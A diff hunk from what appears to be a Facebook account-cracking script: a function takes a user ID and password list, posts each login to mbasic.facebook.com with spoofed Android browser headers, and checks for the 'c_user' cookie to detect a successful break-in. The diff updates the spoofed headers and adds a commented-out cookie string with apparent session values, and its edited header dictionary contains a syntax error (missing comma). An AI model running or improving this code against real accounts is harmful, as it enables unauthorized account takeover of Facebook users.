@@ -391,26 +391,25 @@ def a(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-            'method': 'GET',
-            'scheme': 'https',
+            header_freefb = {'authority': 'mbasic.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
+            # 'cookie': 'datr=_LerZW9aExukCtXu5jOIn03f; sb=_LerZRd859Qou1eqKdYr0Ee6; m_pixel_ratio=2; locale=en_US; vpd=v1%3B728x360x2; wd=360x728; fr=0hoPnJ0Rh8wI6znis.AWVNzfbXcUJk9WqGzkmEzfzzpHo.Blq7f8.Jm.AAA.0.0.Blq7o8.AWU5-wGRjFk',
             'dpr': '2',
             'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-model': '"Infinix X688B"',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"11.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
+            'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            'upgrade-insecure-requests': '1'
+	    'user-agent': pro,}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
